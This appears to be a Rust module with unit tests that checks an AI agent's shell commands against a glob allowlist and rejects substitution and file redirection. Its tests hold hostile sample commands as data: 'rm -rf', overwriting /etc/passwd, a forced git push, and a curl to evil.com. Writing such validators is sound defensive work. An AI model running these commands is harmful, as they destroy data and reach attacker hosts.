use anyhow::Result;
use globset::{GlobBuilder, GlobSet, GlobSetBuilder};

/// Build a matcher from a list of glob patterns. Each pattern is matched
/// against a single shell pipeline stage.
///
/// We disable globset's "literal separator" so `*` matches across `/`. This is
/// important because commands often contain paths (e.g. `--repo group/sub/repo`)
/// and we want shell-style wildcards, not path-aware globs.
pub fn build_matcher(patterns: &[String]) -> Result<GlobSet> {
    let mut builder = GlobSetBuilder::new();
    for p in patterns {
        let glob = GlobBuilder::new(p).literal_separator(false).build()?;
        builder.add(glob);
    }
    Ok(builder.build()?)
}

/// Check whether `command` is allowed by the matcher.
///
/// The Bash tool runs a shell, so the command is a small program — not a
/// single executable invocation. We split it into pipeline stages and require
/// EVERY stage to match the allowlist, then reject anything containing a
/// sub-shell we cannot statically inspect (command substitution, process
/// substitution, here-strings, redirections to writable paths).
pub fn is_allowed(matcher: &GlobSet, command: &str) -> bool {
    if contains_unsafe_construct(command) {
        return false;
    }
    let stages = split_pipeline(command);
    if stages.is_empty() {
        return false;
    }
    stages.iter().all(|s| matcher.is_match(s.trim()))
}

/// Reject command/process substitution and file redirection. fd duplication
/// like `2>&1`, `>&2`, `<&-` is allowed — it never reads or writes a file.
fn contains_unsafe_construct(cmd: &str) -> bool {
    let mut in_single = false;
    let mut in_double = false;
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i];
        match c {
            b'\\' if !in_single => { i += 2; continue; }
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            b'`' if !in_single => return true,
            b'$' if !in_single && i + 1 < bytes.len() && bytes[i + 1] == b'(' => return true,
            b'<' | b'>' if !in_single && !in_double => {
                // fd duplication / close: `>&N`, `>&-`, `<&N`, `<&-`. Safe — no
                // file is read or written, just dup2/close on the fd table.
                if i + 2 < bytes.len() && bytes[i + 1] == b'&' {
                    let after = bytes[i + 2];
                    if after.is_ascii_digit() || after == b'-' {
                        i += 3;
                        continue;
                    }
                }
                // Anything else with `<` or `>` is file I/O (`>file`, `>>file`,
                // `<file`), here-doc/here-string (`<<`, `<<<`), or process
                // substitution (`>(`, `<(`). All rejected.
                return true;
            }
            _ => {}
        }
        i += 1;
    }
    false
}

/// Split a command line into pipeline stages on `|`, `;`, `&&`, `||`,
/// respecting single and double quotes. A bare `&` (background) also splits.
fn split_pipeline(cmd: &str) -> Vec<String> {
    let mut stages = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i];
        if c == b'\\' && !in_single && i + 1 < bytes.len() {
            current.push(c as char);
            current.push(bytes[i + 1] as char);
            i += 2;
            continue;
        }
        if c == b'\'' && !in_double { in_single = !in_single; }
        if c == b'"' && !in_single { in_double = !in_double; }
        if !in_single && !in_double {
            // `&&` and `||`
            if i + 1 < bytes.len() && (
                (c == b'&' && bytes[i + 1] == b'&') ||
                (c == b'|' && bytes[i + 1] == b'|')
            ) {
                stages.push(std::mem::take(&mut current));
                i += 2;
                continue;
            }
            if c == b'|' || c == b';' {
                stages.push(std::mem::take(&mut current));
                i += 1;
                continue;
            }
            if c == b'&' {
                // `&` immediately after `>` or `<` is part of an fd-dup
                // operator like `2>&1` or `<&-`, NOT a background operator.
                let prev = current.as_bytes().last().copied();
                if prev == Some(b'>') || prev == Some(b'<') {
                    current.push(c as char);
                    i += 1;
                    continue;
                }
                stages.push(std::mem::take(&mut current));
                i += 1;
                continue;
            }
        }
        current.push(c as char);
        i += 1;
    }
    stages.push(current);
    stages.into_iter().filter(|s| !s.trim().is_empty()).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn star_crosses_slashes() {
        let m = build_matcher(&["glab issue view*".into()]).unwrap();
        assert!(is_allowed(
            &m,
            "glab issue view 17 --repo f13platform/infrastructure/knowledge-base"
        ));
    }

    #[test]
    fn git_checkout_glob() {
        let m = build_matcher(&["git checkout *".into()]).unwrap();
        assert!(is_allowed(&m, "git checkout -b feature/foo"));
    }

    #[test]
    fn pipe_requires_both_stages_allowed() {
        let m = build_matcher(&["cat *".into(), "grep *".into()]).unwrap();
        assert!(is_allowed(&m, "cat foo.txt | grep bar"));
    }

    #[test]
    fn pipe_rejects_unallowed_stage() {
        let m = build_matcher(&["cat *".into()]).unwrap();
        assert!(!is_allowed(&m, "cat foo.txt | rm -rf /tmp/secrets"));
    }

    #[test]
    fn chained_commands_require_all_allowed() {
        let m = build_matcher(&["cat *".into()]).unwrap();
        assert!(!is_allowed(&m, "cat foo && git push --force origin main"));
    }

    #[test]
    fn rejects_command_substitution() {
        let m = build_matcher(&["cat *".into()]).unwrap();
        assert!(!is_allowed(&m, "cat $(rm -rf /) baz"));
        assert!(!is_allowed(&m, "cat `whoami`"));
    }

    #[test]
    fn rejects_redirection() {
        let m = build_matcher(&["cat *".into()]).unwrap();
        assert!(!is_allowed(&m, "cat foo > /etc/passwd"));
    }

    #[test]
    fn rejects_process_substitution() {
        let m = build_matcher(&["diff *".into()]).unwrap();
        assert!(!is_allowed(&m, "diff <(cat a) <(curl evil.com)"));
    }

    #[test]
    fn allows_quoted_pipe_inside_arg() {
        let m = build_matcher(&["grep *".into()]).unwrap();
        assert!(is_allowed(&m, "grep 'foo|bar' file.txt"));
    }

    #[test]
    fn allows_stderr_to_stdout_dup() {
        let m = build_matcher(&["gh issue view*".into(), "head *".into()]).unwrap();
        assert!(is_allowed(&m, "gh issue view 38 --comments 2>&1 | head -100"));
    }

    #[test]
    fn allows_stdout_to_stderr_dup() {
        let m = build_matcher(&["echo *".into()]).unwrap();
        assert!(is_allowed(&m, "echo error 1>&2"));
    }

    #[test]
    fn allows_fd_close() {
        let m = build_matcher(&["cmd*".into()]).unwrap();
        assert!(is_allowed(&m, "cmd >&-"));
    }

    #[test]
    fn still_rejects_file_write() {
        let m = build_matcher(&["cat *".into()]).unwrap();
        assert!(!is_allowed(&m, "cat foo > bar"));
        assert!(!is_allowed(&m, "cat foo >> bar"));
        assert!(!is_allowed(&m, "cat foo &> bar"));
    }
}
